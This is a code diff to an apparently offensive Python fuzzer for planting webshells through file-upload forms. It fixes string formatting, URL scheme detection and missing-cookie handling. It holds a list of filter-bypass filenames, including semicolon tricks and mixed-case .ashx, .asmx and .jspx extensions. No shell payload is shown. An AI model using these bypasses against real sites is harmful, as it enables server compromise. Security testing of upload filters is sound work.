@@ -490,30 +490,30 @@ def fuzz_upload_webshell():
         fuzz_file_name.append({'desc': '上传.cDx;test.%s文件,只适用于asp' % work_suffix, 'modify': {
                               'filename': 'test.cDx;test.%s' % work_suffix}})
     if script_suffix == 'aspx':
-        fuzz_file_name.append({'desc': '上传.ashx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.ashx文件,只适用于aspx', 'modify': {
                               'filename': 'test.ashx'}})
-        fuzz_file_name.append({'desc': '上传.aShx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.aShx文件,只适用于aspx', 'modify': {
                               'filename': 'test.aShx'}})
-        fuzz_file_name.append({'desc': '上传.ascx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.ascx文件,只适用于aspx', 'modify': {
                               'filename': 'test.ascx'}})
-        fuzz_file_name.append({'desc': '上传.aScx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.aScx文件,只适用于aspx', 'modify': {
                               'filename': 'test.aScx'}})
-        fuzz_file_name.append({'desc': '上传.asax文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.asax文件,只适用于aspx', 'modify': {
                               'filename': 'test.asax'}})
-        fuzz_file_name.append({'desc': '上传.aSax文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.aSax文件,只适用于aspx', 'modify': {
                               'filename': 'test.aSax'}})
-        fuzz_file_name.append({'desc': '上传.asmx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.asmx文件,只适用于aspx', 'modify': {
                               'filename': 'test.asmx'}})
-        fuzz_file_name.append({'desc': '上传.aSmx文件,只适用于aspx' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.aSmx文件,只适用于aspx', 'modify': {
                               'filename': 'test.aSmx'}})
     if script_suffix == 'jsp':
-        fuzz_file_name.append({'desc': '上传.jspx文件,只适用于jsp' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.jspx文件,只适用于jsp', 'modify': {
                               'filename': 'test.jspx'}})
-        fuzz_file_name.append({'desc': '上传.jSpx文件,只适用于jsp' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.jSpx文件,只适用于jsp', 'modify': {
                               'filename': 'test.jSpx'}})
-        fuzz_file_name.append({'desc': '上传.jspf文件,只适用于jsp' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.jspf文件,只适用于jsp', 'modify': {
                               'filename': 'test.jspf'}})
-        fuzz_file_name.append({'desc': '上传.jSpf文件,只适用于jsp' % work_suffix, 'modify': {
+        fuzz_file_name.append({'desc': '上传.jSpf文件,只适用于jsp', 'modify': {
                               'filename': 'test.jSpf'}})
 
     fuzz_content_type = [
@@ -1054,13 +1054,16 @@ if use_packet_file:
     if args.force_ssl:
         url = b'https://' + host + uri
     else:
-        if b'http://' + host in packet_file_bytes:
+        if b'https://' + host in packet_file_bytes:
+            url = b'https://' + host + uri
+        else:
             url = b'http://' + host + uri
-        elif b'https://' + host in packet_file_bytes:
-            url = b'https' + host + uri
     url = url.decode('utf8')
     referer = re.search(b'Referer: ([^\r\n]+)', packet_file_bytes).group(1)
-    cookie = re.search(b'Cookie: ([^\r\n]+)', packet_file_bytes).group(1)
+    try:
+        cookie = re.search(b'Cookie: ([^\r\n]+)', packet_file_bytes).group(1)
+    except:
+        cookie=b''
     rsp = get_request(referer.decode("utf8"), cookie=cookie.decode("utf8"))
     origin_html = rsp['content']
     boundary = re.search(
